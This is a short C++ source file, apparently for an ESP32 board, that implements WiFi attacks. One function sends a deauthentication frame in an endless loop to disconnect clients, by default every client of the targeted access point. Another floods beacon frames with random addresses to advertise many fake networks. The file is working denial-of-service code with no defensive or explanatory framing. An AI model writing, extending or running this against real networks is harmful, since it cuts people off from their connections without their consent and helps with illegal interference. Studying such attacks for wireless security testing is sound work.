#include "wifi_attacks.h"
#include "WiFi.h"
#include "wifi_frames.h"
#include <vector>
#include <WString.h>

static bool deauth_flood_active = false;
static bool beacon_flood_active = false;

void startDeauthFlood(const uint8_t* bssid, const uint8_t* client_mac) {
    deauth_flood_active = true;
    uint8_t deauth_frame[26];
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    if (client_mac == nullptr) {
        client_mac = broadcast_mac;
    }
    build_deauth_frame(bssid, client_mac, deauth_frame);

    while (deauth_flood_active) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        delay(1);
    }
}

void startBeaconFlood(uint16_t count, const std::vector<String>& ssids) {
    beacon_flood_active = true;
    uint8_t beacon_frame[128];
    uint16_t frame_len;
    uint8_t bssid[6];
    
    if (ssids.empty()) {
        return;
    }

    int ssid_index = 0;
    while(beacon_flood_active && count > 0) {
        esp_fill_random(bssid, 6);
        bssid[0] = (bssid[0] & 0xFE) | 0x02;
        const char* ssid = ssids[ssid_index].c_str();
        build_beacon_frame(bssid, ssid, 1, beacon_frame, &frame_len);
        esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, frame_len, false);
        count--;
        ssid_index = (ssid_index + 1) % ssids.size();
        delay(10);
    }
}

void stopFloods() {
  deauth_flood_active = false;
  beacon_flood_active = false;
}
